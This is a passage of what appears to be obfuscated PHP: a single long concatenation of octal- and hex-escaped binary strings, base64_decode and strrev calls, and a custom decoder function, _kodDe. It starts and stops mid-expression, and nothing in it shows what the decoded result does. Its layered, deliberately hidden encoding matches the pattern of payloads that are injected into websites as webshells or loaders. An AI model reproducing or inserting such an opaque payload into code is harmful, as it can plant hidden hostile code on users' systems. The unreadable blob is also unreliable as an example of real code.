226\165\120\270\4\2\360"."\212\311\72\377\314\332\231\304\33\103\201\326\240\20\157\162\265\371\132\32\151\314\131\101\103\124\155\45\171\174\141\200\42\67\135\203\334\10\133\214\23\226\23\61\106"."\42\373\153\131\320\36\100\333\101\104\140\312\241\64\200\151\263\165\217\325\267\372\374\36\321\374\2\146\44\107\12\242\353\344\124\231\110\73\107\343\310\20\203\106\40"._kodDe('Llm6HQgKHygxAZDwfDMKkthUAT3cWBMkkLXyXwM9+8LzgAyYr8Z42F3GREHf6g==')."\204\233\116\156\141\1\305\176\34\112\61\113\346\254\221\123\203\212\240\355\115\352\206\152\70\220\132\70\27\203\51\136\70\257\274\2\144\10\112\46\33\37\137\70\315"."\226\325\45\236\213\127\11\143\324\302\2\233\121\347\153\136\105\60\323\270\152\72\214\7\162\131\321\240\271\213\353\373\250\251\167\126\115\131\152\151\25\156\114\225\4"."\25\236\341\361\100\203\331\36\176\263\53\332\72\173\352\51\156\162\151\320\152\262\213\36\155\110\245\355\147\346\353\14\107\246\240\352\106\332\13\76\150\254\372\146\127"."\255\330\226\74\257\36\122\261\217\215\100\310\305\201\176\156\316\14\265\202\274\211\146\55\355\13\260\35\314\214\206\207\64\252\371\203\43\205\226\274\111\252\135\147\35"."\117\353\101\325\110\151\110\215\322\316\337\215\260\164\225\317\70\254\204\352\125\211\52\53\155\265\267\316\245\101\223\101\66\231\366\52\232\231\76\216\101\353\107\142\134"."\0\63\70\7\23\206\312\12\166\72\110\247\115\252\65\222\170\221\215\313\353\134\126\327\233\225\364\140\104\157\323\124\162\347\357\11\264\267\370\3\324\362\223\332\170"."\377\122\247\321\32\346\317\202\110\33\355\224\166\32\12\65\204\14\271\233\0\53\43\67\370\0\237\347\235\117\330\205\271\1\217\34\16\264\206\250\24\16\343\220\345"."\x90\x43\x5e\xf7\x2\x26\x9\x33\x68\x83\xab\x2d\x1f\x2\xab\x8b\xb8\x1a\x8b\x82\x99\x72\x14\xc2\x11\xcd\x90\x43\x1\xc8\xf5\x79\xfd\xd\x79\x5\xc2\x4d\xcc\x1c\xd8\xa\x93\xfd\xbe".strrev('"—EĞvBÙˆ*„'."\0".'˜Š%tÉpŞ¼x*!{kY‡Îkö@‚(Y¹"E¹–')."\71\272\272\256\54\232\130\6\217\26\273\14\116\246\272\350\362\362\262\250\263\316\121\301\370\41\201\155\104\133\204\253\6\251\221\300\322\342\311\116\207\203\124\301\2"."\200\37\143\266\107\164\111\221\127\4\341\134\206\163\233\244\306\345\44\257\57\0\70\304\110\223\34\136\20\146\270\62\7\115\266\115\255\351\226\325\201\263\211\372\315"."\274\314\340\377\240\230\65\242\122\273\314\274\214\226\345\205\363\206\324\370\140\234\135\250\40\220\103\323\71\225\10\43\120\40\303\115\200\160\46\236\143\251\246\127\323"."\x8d\x13\xcf\x41\x73\x12\x8e\x3f\xbe\xe9\x0\x88\x98\x47\x4f\xa1\xf7\x26\xb\xec\x29\x7b\x22\x1a\x69\x84\xc6\xa0\xd1\xd3\x59\x1\xcd\x10\x8c\x32\x81\xf8\x9b\x40\xb6\xac\xf4\xda\x21".base64_decode('TmlZDgga9E4UHgWmvV+jXZrATEmILl5WkA2TLF63LLGbWnfariS7dUDCelIU').base64_decode('qvRa0rlRcEYHYhR9RGcHTQhpODOonBJ0cbrg8mB65DDqQrU0jTwfaACnBX0A')."\247\147\321\341\110\320\151\223\370\63\42\312\51\25\47\151\120\22\12\347\37\46\374\364\240\233\53\325\313\157\21\122\275\114\257\112\317\116\176\262\213\367\273\134\144".base64_decode('Iq+BQFr9IFXik4vO+sGQcPXoag9Pszc1u9x2QAmmTJ9BpjsFJrtJY1Ot9JvT')."\144\150\325\247\122\151\155\362\14\251\7\164\235\314\141\241\171\364\4\253\31\77\6\142\233\345\270\241\46\240\66\231\36\165\30\232\67\267\30\310\217\167\34\307\246"."\140\364\156\241\107\141\35\206\303\300\241\142\355\316\57\332\356\374\142\355\316\317\153\167\176\141\273\30\224\267\206\224\114\306\215\337\374\210\73\317\2\212\213\21\112".base64_decode('orqyGdmqfUcXhCa+1nSAZHCsQ31BguU3eYg9FOgSHkD8r7bzMr9FcpCNPjGH')."\x7f\x93\x8a\x99\x85\x67\x2d\x17\x38\xe1\x6d\x40\x33\x3b\xdf\x45\x13\x71\x43\x9c\x19\x6a\x88\x6e\xe7\xe6\xf3\x31\xa8\x60\x0\x83\xa6\x77\x1\xbe\x80\x53\x37\xcd\x22\xcf\x7\x1\x54"."\xc2\xcf\x74\x73\x98\x9e\x48\x88\x87\x53\xe1\x13\x4b\xcd\x94\x94\x58\x5a\x37\x52\x74\xd6\xc8\xc3\x6\x66\x31\xce\xec\xc9\xb9\xd1\x39\x16\x2\x70\xd8\x1b\x51\x8\x73\xdc\xac\xc\xb8".base64_decode('utWwCskUQaF3IKObqvg4IqEiE1pmVqIMQOJBL50Uo1dlowa9zjO/N1W1l/JP').base64_decode('AsvL2Nwgs4XP7xs17xctIPkjCkgJOPmCU2RPWR4yGewdhvAyGKuS7DxNANiF').base64_decode('fGAI3Wwe7GST9yCc0Lt5/HN6sb7aDf5IIhAO45dic9VB+kYgb5vkPSuINkab')."\243\21\272\264\204\46\101\125\22\35\333\360\217\46\210\224\76\251\350\63\11\232\210\147\52\153\50\135\135\140\364\150\172\111\22\172\11\341\4\205\301\166\260\365\313"."\42\220\43\337\7\343\355\374\221\4\212\67\11\333\0\54\153\364\236\265\310\302\106\360\377\176\151\213\353\13\312\72\164\243\363\355\232\311\11\17\301\61\267\33\104"."\257\150\50\155\22\270\171\103\5\150\117\327\353\11\162\14\56\55\1\53\271\244\272\144\102\31\370\55\57\261\225\300\235\212\342\160\5\100\0\152\250\244\172\102\31"."\12\224\23\33\340\41\142\16\45\30\174\163\245\35\141\312\353\224\154\126\170\266\122\207\220\10\351\310\24\347\24\147\77\241\113\165\113\140\213\374\25\50\316\305\217".strrev('·Oš»’”éÍ'."\r".'–u‰¥1™G '."\0".'ñe’O¡­ÿ8úìw¡Œä8¾').base64_decode('81cas+oGUkmJvKqoLa1yVJZK9OlwbWlrpMF+Smnd7NGz3EhLlVWboZoJvnDB')."\x6f\x6c\x67\x13\xab\x88\x59\x70\xa3\xb3\x88\xd3\x1a\x1b\xae\x2c\xa1\xb6\x29\x65\x48\x4f\x83\xe3\x16\xc8\xb7\x29\x47\x9c\xb2\x71\x80\xf\xa1\x7a\x34\x95\x88\xaa\xdc\x26\xa8\xe\x9b"."\43\71\305\274\116\370\70\314\261\230\236\224\2\203\3\337\113\223\276\150\251\156\51\16\310\211\131\133\2\241\45\222\151\304\251\275\156\211\223\364\10\145\340\66\300".base64_decode('szRSpBQWkboASu0ohJNLZ89yaqQk5HQc8PgI6fTkYVxQH5PnigqqLsGMnWWA')."\x55\x39\xe2\x4a\x9a\xcb\x82\x48\xd0\xa0\xec\x8d\x25\x62\x95\xdb\x99\x44\x48\x76\x91\x88\xaf\x8c\x12\xef\x85\x27\x2d\x7f\x23\x81\x93\x1d\x24\x21\x8\xf\x6d\x9c\x60\x79\x6e\x93\xd5".strrev('«Á›X}À0äİaóö ƒå£+’~IµÈÂ—Ë\\\\RéatàÌŞAMˆáI²')."\100\314\304\41\64\217\277\245\261\203\136\72\242\130\264\243\324\121\261\174\271\123\243\332\302\150\11\315\213\151\230\203\345\306\361\250\303\232\37\164\216\140\223\145\44"."\200\374\234\230\166\235\106\326\347\150\147\5\67\112\141\132\101\11\252\12\153\153\147\167\60\331\235\31\272\121\102\244\125\235\102\347\161\250\307\36\151\147\101\167\13"."\247\302\360\370\344\44\24\276\34\221\343\111\235\116\52\162\164\0\350\152\236\243\3\213\333\20\63\244\353\202\241\2\132\211\330\350\317\21\207\352\160\150\101\51\134"."\277\324\365\261\327\156\342\316\305\141\127\46\43\106\331\256\35\114\252\316\244\26\163\262\35\345\104\60\107\234\233\322\320\54\150\157\347\301\241\176\60\57\1\372\152".base64_decode('QOA+wIHoBqMGDA7qYkAWmGXGDS2TtdAC7NyiBD11XKz0KThLiURfuZeg1xol').base64_decode('YO/jFEIAeFdmQYcQkqEma0tQd80eVQXle8DZVbQRULBEohQopTCMGVkdyO3s').base64_decode('5WrLAhyYg3/GL8S/E8ZzTsXQk0lw1qL7VERUkCaoiwty5L11MBSIBNz0lWgx')."\211\17\200\110\67\260\115\22\77\210\51\200\253\42\10\204\232\260\345\322\151\246\243\205\354\33\263\34\305\306\242\341\236\134\26\52\262\310\250\0\33\21\201\326\203"."\46\1\13\266\333\100\54\310\250\11\262\273\0\257\312\314\303\61\274\110\11\254\23\200\365\321\235\303\345\200\51\225\225\225\366\312\52\360\217\351\353\110\175\325\225"."\225\5\131\52\53\253\321\77\162\62\103\205\0\101\226\65\5\354\153\112\143\50\123\12\370\142\13\273\0\44\234\34\145\77\1\162\220\203\233\152\112\0\152\4\106"._kodDe('LTeT0kM5Qb49hxDgUL2nWXG9obfdtPLfiPk3WZYXlBFkkAzBNWAAMivqtV0LxQ==').base64_decode('Vis2Bne9zhFZqGzJsjSxffyYDLBt7LiA+QRzPxhtAIyiycy/IASchXE2WggQ')."\274\130\100\131\40\314\345\13\30\25\65\341\50\231\31\156\241\130\222\331\354\302\150\13\253\251\330\22\353\321\373\145\176\30\302\350\151\54\246\162\14\21\344\121\72"."\107\27\20\125\370\22\125\54\62\203\355\325\222\26\253\107\152\171\327\3\105\7\132\237\204\365\75\126\224\163\224\242\207\105\310\363\205\212\164\314\325\243\5\134\31".base64_decode('umDEWfzegcLC/8tVBIV4KQDzTm5meC5UkJ+UV8aVEJyRQObWQZlboQ4IDxYH')."\x3b\xac\xbc\xb0\x98\xb3\x48\x26\xd6\xb8\x98\x4f\x4\xc2\x55\x48\x7d\x56\x90\xd9\xa4\x4c\x12\x64\x40\x19\x81\x12\xb2\xf2\x57\xe2\x2\xd0\xba\x56\x85\x4\x37\x7b\x9f\x29\x2\xa1\x1b".base64_decode('mVbBswxr1OpkBx7QeTWTdP6wW9PdZHbgGLjm1ArHsB0r19DAZWRTok4w4UEU')."\265\255\210\56\62\113\5\110\106\53\253\11\272\235\140\33\103\210\241\253\16\7\172\37\302\271\307\274\150\376\165\10\332\343\131\272\115\311\366\101\231\70\72\60\241"."\xc4\xf1\x22\x2d\x90\x42\xac\x88\x83\xde\x8e\x38\xe2\x5d\xdd\x79\x20\x36\xdd\x26\x56\x84\xb\xbe\xe\xa\xb2\xa8\x9c\x75\x46\xc6\x34\x80\x9f\xa3\xd4\xa2\x59\x1f\x2\x9b\x5b\x71\x4e"."\x77\x54\x4a\x65\xed\x40\x24\xd1\xfb\x4d\xa9\x25\x22\xcd\x70\x4c\xa9\x91\xda\x3\xed\x33\xa6\x95\x4b\x80\xe3\x49\xaa\xed\x6a\x6c\xae\x96\x75\x4e\x9f\x3a\xd3\x31\x75\x86\x54\x36\xb7".base64_decode('KdLst0nQJFhqBByUXi65eww9pTqnzITWnNOmT3WcOk0KK12KoZFShIQQ65N+')."\362\13\235\253\311\102\227\145\101\4\306\307\42\16\243\133\40\270\312\44\213\214\214\354\156\260\242\266\3\126\105\214\51\240\50\212\152\26\62\243\32\360\213\235\341".base64_decode('64C7r5NvRAn6Q7Iogk9ejX8VQcTRmaMaSJ7JMmz0B+pdyBZEbgpQ5yiAHUZL')."\217\371\165\321\365\136\173\26\110\35\354\155\161\273\142\100\146\303\26\321\165\51\245\244\7\45\222\52\351\351\152\126\7\101\41\316\212\43\301\246\240\354\152\215\64".base64_decode('CfY0DBQkjDXyAgMhgZDvdBe3pI0pJmVy29vb7ZAdhorWOHIgUw8TAe+nJFO1')."\45\275\172\2\360\336\271\104\11\257\320\11\304\154\300\157\125\111\255\151\205\170\172\240\163\106\235\1\245\165\273\360\2\67\317\35\120\136\242\325\173\214\104\230\22"."\213\17\11\332\47\234\344\121\341\315\272\160\217\21\0\354\273\240\37\243\36\130\310\157\163\240\215\150\13\334\201\40\341\77\233\347\62\316\121\324\75\172\324\14\245"."\60\356\2\377\35\210\317\35\110\45\153\30\27\215\364\13\70\161\226\247\32\220\234\114\27\330\120\22\310\223\66\253\75\265\45\36\127\133\65\340\261\75\325\112\62"."\11\123\1\203\74\313\311\63\222\111\5\214\154\260\301\307\214\155\202\160\226\210\251\23\161\72\344\265\70\103\263\352\74\112\300\144\224\160\235\107\11\352\123\211\104".strrev('Ÿ®H„5Y¤	( ¬!Sh^<†´Zje€–2ƒè±*ÕâmÏ¦«r‘æm')."\232\304\353\47\200\10\100\222\321\111\13\261\12\21\23\207\314\76\332\127\30\65\226\164\126\252\133\315\222\103\0\301\141\357\22\316\134\132\33\260\143\217\112\272\61".strrev('ßø(ô{2TP!İ‰Ä%µÃD“æòDI@ß©Œx}ø¨?=Q(Ú+eç')."\xac\x70\xb5\x3a\x0\xe7\xe\x8c\x6c\x76\x20\xb6\x18\x74\x12\x8\x27\x48\x36\x99\xe5\x14\xd3\x40\x46\x40\x3f\x4c\x40\xa0\x67\xb3\x59\x81\x39\x28\x10\x55\x7\x7\x87\xba\x32\xdb\xba".base64_decode('NrHnLubPhi9MIN2RddmmGIPVUhG/OEmy3QpXO4WluAY7zw0Y28lQ2w56WXvK')."\214\151\225\225\266\242\376\275\40\316\44\342\171\247\71\154\307\333\332\336\246\1\42\341\241\67\357\310\241\121\265\104\226\276\115\242\73\2\207\202\320\317\227\115\102"."\xcb\xd3\x26\x35\x7a\x23\x0\xdc\xa\xfe\xe0\x8d\x6b\x93\xe0\xae\x6\xc9\x60\x97\xdb\x24\x78\xef\x6d\x93\x5a\x5b\xf0\x2f\xf7\x37\x5\xd0\x88\x17\x2\xd2\x3a\x23\xac\x82\x38\x5c\xc3".strrev('-)í5¶5tŒæd€Y5|‡>¬1§ S©Î'."\r".'U7\'@2[ù'."\n".'=Á$”I8™t')."\x6e\xe8\xa6\xde\x95\xb5\x83\xd5\x51\xd\x45\x64\x6b\x1d\x6e\x78\x3a\x11\xd9\xf4\xff\x57\x3\xec\x5\x75\x77\xf6\xff\xaf\x5\xf2\x62\xae\x2c\x38\x79\x62\x40\xce\x33\xff\x4f\x75\x50".strrev('pH|L	¤B¹9šZoÜLÍ¨úP—ÿ?vL‘E(Z2’6`Â¾yÙ‚å…PÆ’').base64_decode('EqVbD4OIhT6TgSUobSazDe+9EpoZh2UH2Tjggd+nwjSKLJwTE69ENWoF0y0G')."\xb6\x64\x4\x15\xe2\x9c\x60\xbf\x27\x73\x26\xa8\x8c\xe7\xc6\x69\x2c\x7b\x2\x9e\x3c\xb3\xb5\x34\x38\x17\xb4\x2c\xa2\x66\x18\xc2\x32\x0\x7e\x49\xa5\xfb\x1f\x96\x87\xf7\x1d\x4e\x4"."\x74\x72\x52\xc\xcb\xe1\x8c\xac\x1c\x79\x36\x34\xdb\x87\xab\x56\x61\x16\xa\xb3\x8e\xa\xde\x16\xcc\xa6\xbb\x42\xcf\x28\x4b\x72\x2a\x83\x57\xe7\xed\x12\x36\x66\x54\x88\x2d\x83\x3c"."\x8c\xd1\x5c\x16\xd4\xb2\xe5\x82\xab\xf4\x83\x74\x7b\x4\xb5\xc1\x69\x51\x1a\x9f\x9\xd5\x12\x7c\x18\x6a\x7\xf4\xa4\xaf\x80\x3a\x17\xac\x5\x38\xa1\xc3\x92\xc7\x61\x8f\xed\x5f\x3c"."\x4b\xb1\x92\x8c\x1e\xa5\x68\xb1\xe1\xe0\x7c\xbb\x77\x20\x3\xfa\xa8\x26\xc0\xd9\x9c\x5\x13\x66\xb9\xbc\x76\x2e\xc4\xbe\xf6\xb0\x11\x71\x45\xb9\x9d\x6\x98\x71\x28\xb1\x65\x23\x96"."\x2a\x7d\xe8\x60\x22\xf4\x1a\x32\xbc\x24\xdc\x7\xf6\x3\x34\xaf\x4b\x54\xe5\x3\xa6\xd0\xdc\x7a\x57\x57\x4c\xa3\x1a\x50\x42\x4d\xfb\x90\x83\x30\x5a\x4\xdf\xff\xd2\x58\x26\xa9\xa4"."\125\352\243\252\17\24\225\5\7\122\155\142\301\66\153\101\226\225\46\103\273\137\303\242\64\103\135\227\361\155\34\201\14\310\31\65\151\202\77\206\214\156\320\50\174"."\160\30\170\74\151\100\303\363\204\30\327\122\120\332\121\130\47\15\65\1\275\371\366\322\74\100\314\3\134\277\10\211\45\163\252\5\240\44\63\75\12\202\140\0\361"."\xf3\xe0\x8e\x39\xdd\xdd\x4e\xb7\xe1\x74\x13\xab\x36\xe2\xaf\x64\x7f\x92\x4c\x4e\x2d\x62\x5f\x4b\xbd\x43\x60\x7\x84\x48\xa8\x80\x6\x8f\xcc\xdd\x60\x1e\x9c\xfb\x71\xcb\x4b\x60\x9e".base64_decode('3gQ4NPNEPg2FlJCeFby1UbNElNSVpAKjr7lRbvD7gjJi8AMtEZc/LwEQx4jP')."\x5d\x0\xe6\x6e\xd3\xf2\xba\xc7\xbc\xce\x11\xd9\x54\x4b\xa3\xf3\x3c\xc8\x6d\x34\x53\x26\x19\x0\xf2\x99\xc5\x5e\xbe\x59\xbc\x44\x23\x25\x3b\xe\xd6\xcc\x8a\x19\x4e\x7a\x9b\x16\x13"."\xe4\x1e\x33\xa5\x40\x4d\x2f\xdd\x33\xf8\x77\x82\xd3\x24\x86\xd\xd4\xb8\xcf\xef\x23\xbb\xc5\xa9\x18\xf1\x1e\xd\xaa\x17\xa8\x7f\xc6\xa0\xdb\x7f\x3a\x18\xb\xb4\xd0\xa\x84\x5c\xa1"."\x5\xb2\xc7\x17\x62\x29\x11\x57\x68\x98\x14\x58\x86\x3c\x1f\xa0\x16\xed\x35\x73\xe6\xcc\x21\xee\x32\x32\xf1\x24\xe2\xb5\x1c\x50\xd9\xce\xae\x24\x0\x34\x6b\x28\x71\xb5\x10\xaa\x14"."\xe6\x84\x92\x3e\xba\x73\xe3\x50\xc0\x24\x86\x14\xc3\x85\x47\x50\x24\xf1\x74\x2d\x33\x4c\xa2\x96\xa1\x5e\xb3\xa9\x83\x38\x35\x93\xa3\xef\xf8\x15\xa6\x8b\x30\x1c\xdd\x43\x24\x4c\x3"."\364\167\46\371\35\40\277\261\41\262\262\25\143\61\231\56\205\124\250\231\72\55\313\175\240\167\17\201\303\46\311\26\143\7\122\347\165\112\156\45\135\232\225\2\40"."\x5b\x8d\xd4\xc\x6f\x1\xd3\xdd\xd2\x10\x40\x5\x7e\xc3\x6a\x72\xb3\xb2\x7c\x3f\xc3\x6a\xbc\x47\x97\xf2\x5\x4b\x1a\x1d\xbe\xd\x5e\xd\x1\xe7\xa8\x1a\x5\xd2\x4f\xd0\x41\xb2\x2c"."\xc9\x66\x26\x31\xea\x9f\x11\xc7\xc8\x35\xb2\xc3\x41\x5d\x20\x3\xd9\x1\xd0\x13\x6b\x26\xf4\x88\x89\x5a\xf7\x20\x85\x8e\xc\x48\x9d\xf0\xbc\x5\x32\x4b\x12\x3c\x5d\xd0\x8d\x83\xc5"."\60\161\256\236\40\363\130\215\375\217\46\324\201\32\11\335\374\222\127\307\305\215\133\121\63\22\150\6\336\263\112\330\227\264\105\13\201\63\24\100\252\55\312\14\262"."\121\270\147\263\274\216\117\254\254\252\24\156\121\174\156\157\130\76\55\14\237\117\371\175\324\40\322\232\340\3\151\221\320\60\51\256\320\160\51\201\372\323\206\111\161"."\123\121\302\232\342\17\4\302\242\165\155\136\367\132\203\302\233\21\42\34\13\307\70\14\126\315\240\54\202\236\124\25\252\341\67\350\25\137\227\222\244\313\245\245\325".base64_decode('T8hhlCz7KJk96g4hSmg6dZPgJjZM0dzEymn0Uo47RoEIFn24Iw6ChHUk/OGw')."\24\127\360\155\126\114\305\134\206\232\200\217\316\340\20\45\321\111\331\170\370\242\324\351\54\163\114\56\237\60\76\45\302\242\25\20\30\255\160\216\157\45\335\30\317".strrev('»ßÎ[N—:ÙqIsFİÙ”ÖJ8úä£@ƒÆV‹(¨îZVY+,.wÃ a').base64_decode('RDscFdFOVh4AlgLAcgbo72H+DaEhFstlVpR1lJR2Oio6FkajnTBYDmDVEB4N')."\73\52\312\155\165\23\234\255\232\51\346\307\257\166\207\315\103\246\200\136\50\147\124\112\373\40\113\244\1\51\14\335\201\210\352\277\240\27\34\1\302\373\210\154\52"."\x23\xec\x5\x68\xaf\x3f\x63\x9a\xa8\xe8\xc6\x10\x7a\x80\xe5\xe8\x91\x8b\x82\xf4\xd2\x35\xc3\x15\xfe\x56\x77\xeb\x2c\x5a\xdc\x88\x14\x1a\x7e\xa\x5d\x31\x26\xb\xa5\x64\xf1\x6d\xe"."\x82\x88\x8e\x55\x60\x5c\x70\xc2\x23\x74\xc\x30\x7f\x82\xa9\x22\xac\x88\x1a\xe4\x62\x18\x34\xde\x19\xc6\xa4\x15\x3b\xa3\x7\xbd\x15\xfa\x84\xcd\x53\xb8\x63\x5c\x74\x86\x37\xe5\x79"."\112\46\62\131\121\24\210\370\303\141\260\250\311\6\105\305\100\313\110\146\242\46\167\134\313\335\37\43\10\201\370\225\363\332\147\156\233\223\202\250\353\141\347\21\142"."\140\34\314\223\56\215\122\366\213\247\304\225\14\264\153\113\364\151\11\125\207\63\102\62\260\120\153\20\276\123\200\104\106\246\352\133\1\344\153\361\311\141\337\351\336"."\202\4\370\12\265\170\12\340\61\42\76\312\173\11\360\226\0\172\115\140\201\267\266\314\155\11\264\27\313\32\151\16\162\376\105\110\162\273\132\42\262\40\371\142\221"."\10\10\166\114\46\242\252\367\270\21\237\72\45\306\66\33\263\261\247\22\3\331\57\204\260\11\156\357\7\354\354\156\242\210\373\171\122\14\351\174\111\27\206\163\2".base64_decode('LyYP4wl+WLf5ZEUJrvMH2eZP0V6k2FU4tHLmX53IMT/tpmhImmFuNsnFpQFS')."\x8d\x4\x74\xec\x25\x68\x5\xd3\xd9\x90\xda\x2d\x46\xfd\x3a\xf3\x1b\x85\x58\x87\x22\x55\x40\xff\x46\xc2\x15\x18\x14\x8a\x5c\xf1\x6c\x4e\xf4\xa3\xc4\xbd\x9e\xc1\x58\x23\x7f\x1a\x26"."\334\321\333\253\44\66\42\236\137\306\155\340\310\144\41\13\52\131\354\306\137\232\62\265\172\372\251\340\37\331\277\320\32\6\357\164\370\324\63\35\316\305\230\3\332"."\274\53\172\372\200\115\22\57\307\251\67\44\130\1\162\355\3\373\146\212\151\240\132\350\241\213\367\131\54\202\332\54\50\202\323\340\375\64\247\173\142\212\11\146\13".base64_decode('Im34lCJNoSQBt3EqQZJDiiBxAccVeyM1xT6VvKLQxacZ+LqbINc+RRIWGqRM')."\302\332\300\172\20\206\106\156\300\221\344\171\164\301\317\70\362\302\243\210\67\253\21\235\115\55\162\103\304\142\334\354\4\173\207\43\224\75\101\47\21\171\365\311\25"."\273\276\305\100\344\366\247\350\365\56\106\33\114\366\130\336\150\241\32\55\215\131\113\30\370\221\213\350\302\16\25\341\175\342\117\327\0\10\110\126\350\303\65\174\270"."\374\155\5\166\111\104\37\342\271\22\211\174\160\104\147\300\302\367\31\16\366\242\220\74\355\47\276\267\313\312\41\227\145\261\5\154\36\144\217\257\301\374\240\63\254"."\231\72\313\66\305\10\115\145\253\317\264\104\360\343\41\113\151\6\142\271\372\325\30\43\320\204\144\66\5\235\14\124\117\321\304\374\356\20\13\47\356\315\31\127\32".strrev('â‘5ŒıÖWB5ß'."\n".'Í[©\\ğ¾=û#@şK‹JUò¢—½š³T%µ¾?oŒ ')."\56\347\30\165\34\204\202\166\244\144\261\213\246\317\46\23\171\304\207\126\334\23\221\120\61\236\165\261\72\250\241\261\47\230\211\113\136\136\312\54\24\224\20\333\27"."\xca\x40\x91\xc9\x4a\x1\x10\x98\x8\x53\xd6\x7a\x6\x55\xf4\x29\x94\xa2\x6d\xe7\x8a\xb4\x4b\xf2\x27\xb9\x95\xa8\x50\x40\x4b\xf7\x69\xa6\xc6\x37\x37\x45\xd5\xa0\x98\xbf\x0\x97\x68"."\50\102\206\204\370\12\224\243\225\265\123\140\302\304\343\70\17\361\152\46\330\316\24\302\231\1\33\364\250\125\160\24\100\63\104\160\366\52\354\126\73\103\237\356\21"."\57\311\314\66\12\107\335\134\151\150\361\64\110\222\201\324\251\150\164\365\343\260\120\42\4\277\146\62\134\165\5\271\265\4\167\43\230\327\31\55\301\336\156\0\254".base64_decode('CV6Q879NAZO5rR9zwMbtyrC/TrfoERo+FBEs3cnAuJdW4vMNOXnjnxOxkc+M').strrev('U\')¥NÜtÌË‘ÈçÌê$½1}xá<& ½æúo[£)üpBÆ Ø').strrev('I¯%X|°"O"s}ˆb€\'ê2°]ÇE'."\r".'/¡··0AÏ°qCß¥îkPä—²—')."\223\70\246\131\6\251\126\252\104\106\236\374\153\116\322\54\352\63\1\242\206\370\17\205\216\341\274\251\114\166\60\77\305\120\273\14\325\354\341\237\310\302\217\2\233".base64_decode('NJO7RSkCQkwLl1kgT6inBgsAFms+P+00e2cIncGCxSHiAZFVLyBfNhTC3lNt')."\120\143\237\15\346\173\263\45\305\207\255\313\126\151\53\162\26\131\216\36\13\25\107\21\141\161\42\243\37\301\345\0\363\164\311\14\51\11\0\116\75\343\210\141\47"."\5\206\151\42\376\211\222\137\112\301\13\332\202\356\327\45\260\366\44\66\347\54\340\266\174\56\115\106\137\117\53\110\154\126\371\3\53\62\52\133\336\151\45\74\335"."\xa7\x1e\x7a\xb9\xb\x60\xee\x9c\x97\x6f\xb5\xdb\x6f\x3b\xf3\xb6\xbf\x7f\xfd\xa\x8e\x9c\xb7\xf5\xab\x97\x77\xed\x79\x7c\xdf\xd5\x38\xba\xc\x3b\x26\x47\x61\xee\x9a\x7c\x79\xfb\x52"."\375\44\357\21\277\336\261\372\226\365\145\207\375\345\262\147\133\306\376\365\300\327\356\271\341\331\173\216\256\331\273\163\153\333\253\247\277\367\331\17\257\77\272\275\26"."\374\34\371\375\355\373\277\265\347\342\233\113\126\171\216\74\244\342\222\71\147\317\270\142\116\344\376\35\333\337\77\145\337\161\237\276\363\171\355\365\127\35\245\351\135"."\173\167\165\235\361\315\264\203\16\372\151\117\355\336\357\36\35\171\335\41\157\135\176\164\363\15\323\316\134\270\142\154\351\242\123\147\334\277\243\363\300\245\113\306\276".base64_decode('v2veb6vKS97Y9emmgYlzK1dc/ewtZ41aHxjxyqtrDn176VT7P0Y+kBwXftvT')."\167\305\21\137\375\171\336\342\225\201\275\337\136\163\315\45\243\317\353\30\74\277\256\354\314\375\177\276\245\172\176\337\25\201\316\237\317\235\152\34\73\366\320\33\133".base64_decode('t94w6cklZb2J1uP/tqDXc9ZQ9PUb394y9Z/ljmdOCk48btbPN1/iHH9D/erV')."\275\7\134\127\377\247\117\107\235\362\334\336\123\76\331\357\357\327\157\161\165\354\232\266\62\370\374\246\343\22\327\264\154\271\64\65\367\356\371\347\326\57\30\21\333".base64_decode('f/vnR869s3rTxticTw+5fY36ytnfz//VR5tGXbvBc/WaD2x7n5kxsWvappGD')."\x17\x6c\x7e\xab\xef\xf2\xe8\x4d\x2b\x7f\x3b\x69\xe5\x1f\xf\xfc\xc7\x88\xa6\xfe\xa7\x9e\xf7\xdd\x78\xfc\x21\x73\x4f\xdc\xf3\x48\xef\xe9\x4f\x57\xbd\xd3\xb4\xf2\xf0\xf0\x98\x27\xef"."\35\165\317\27\243\137\153\273\344\346\357\247\255\174\244\371\240\357\247\154\75\366\144\367\23\177\277\372\311\352\367\203\107\55\51\73\160\332\264\163\276\171\143\242\161".strrev('·÷Âøk	šğÿéÛ«işfø3­öñ¿ÚnÅ&û™U¡IÇSMmª:^g1Âù')."\47\367\173\311\275\272\356\137\353\154\47\335\163\126\245\177\355\221\211\213\137\176\167\314\366\363\26\227\136\152\133\173\113\373\326\103\126\226\276\222\272\371\220\263\154"."\356\355\27\275\361\361\316\231\117\216\376\364\340\231\143\36\274\343\233\143\327\244\256\337\266\342\312\27\203\177\373\340\363\343\307\306\376\170\302\7\353\107\164\324\74"."\233\171\352\204\253\313\27\237\272\361\340\143\46\36\362\227\201\333\323\103\255\317\16\316\376\251\355\327\317\7\353\135\143\227\64\334\60\245\345\206\125\33\273\215\336"."\25\337\16\335\26\251\320\267\215\121\267\154\337\342\174\355\256\235\367\36\63\44\327\37\264\152\317\264\256\261\245\365\123\73\373\306\36\134\376\351\201\373\177\327\173".strrev('y¿¥'."\r".'ÒùşG+î}À»>Íõã×i:&WJîxÿG’úDf8^ÏMÆï6û3	Ô').base64_decode('6NbrHTGt+az3yi7yNb98zusvv3/MnQ2HfrR3Zfjpg2658ZCD0443uqOj5u67')."\372\370\77\332\253\237\212\377\332\270\262\172\315\345\307\66\171\303\333\2\107\216\271\367\137\173\216\35\331\171\171\155\363\234\27\112\136\77\165\313\374\140\370\64\307".base64_decode('3S/su/LtO3e1zb2zbd2Dr23ectPCutbLdum3T7O/8/xx22qu235DTF/x9AMv')."\326\174\334\362\156\117\166\311\221\237\336\62\363\327\151\373\232\115\347\316\150\277\60\22\277\353\236\313\327\267\277\174\103\133\377\31\17\355\170\251\376\340\37\246\167".base64_decode('Xzuu7II3dlyz46S76l946fZjfWtfveuHncumy8d29Y6Il60996DW244+4aPe')."\33\355\177\63\347\74\62\70\256\352\271\363\77\136\172\325\252\321\177\53\267\337\375\331\127\257\214\31\365\310\213\336\313\326\255\364\276\373\370\334\165\253\174\17\75"."\122\346\371\374\375\350\5\75\353\217\170\354\333\262\121\267\125\254\211\70\27\356\330\363\342\230\173\57\275\172\356\226\100\163\213\174\375\303\307\277\176\362\375\306\23".base64_decode('X9Z+b3zx/u9fOlz+2dj4u9/teWVff+CPYz//Qj717d/VLvv5xy+fuO+cX9dd')."\xfc\x87\xc7\x7e\xb3\xfc\xbb\x1f\xd6\x2c\x2d\x99\xd1\xff\xe0\xa6\x8b\xeb\x92\xf3\xa7\x9e\x3c\x6a\xfc\x8d\xed\xef\x8d\x5b\x5b\xd2\xe8\x79\xf3\x99\xaa\x5b\x6c\x53\xb7